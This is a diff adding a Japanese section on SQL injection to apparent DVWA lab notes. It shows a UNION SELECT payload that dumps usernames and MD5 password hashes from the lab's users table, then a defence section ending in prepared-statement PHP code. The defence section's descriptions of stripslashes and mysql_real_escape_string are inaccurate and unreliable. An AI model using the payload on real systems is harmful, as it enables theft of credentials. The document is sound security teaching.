@@ -146,3 +146,72 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 generateSessionToken();
 ```
 </details>
+
+### SQLインジェクション
+#### 攻撃手法
+```shell
+## enter sql injection
+$ ' UNION SELECT user, password FROM users#'
+
+## response
+ID: ' UNION SELECT user, password FROM users#'
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+ID: ' UNION SELECT user, password FROM users#'
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+ID: ' UNION SELECT user, password FROM users#'
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: ' UNION SELECT user, password FROM users#'
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: ' UNION SELECT user, password FROM users#'
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+#### 有効的な防御手段
+- `stripslashes` を使用する
+  - 入力文字内のシングルクォート(’)はダブルクォート(")に置換
+- `mysql_real_escape_string` を使用する
+  - すべての (') の前に (/)が追加
+<details>
+    <summary>SQLインジェクションを防御するソース</summary>
+
+```php
+<?php
+if( isset( $_GET[ 'Submit' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $id = $_GET[ 'id' ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+        $data->bindParam( ':id', $id, PDO::PARAM_INT );
+        $data->execute();
+        $row = $data->fetch();
+
+        // Make sure only 1 result is returned
+        if( $data->rowCount() == 1 ) {
+            // Get values
+            $first = $row[ 'first_name' ];
+            $last  = $row[ 'last_name' ];
+
+            // Feedback for end user
+            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+?>
+```
+</details>
+
+[SQL_injectionの解説動画](https://www.youtube.com/watch?v=5bj1pFmyyBA)
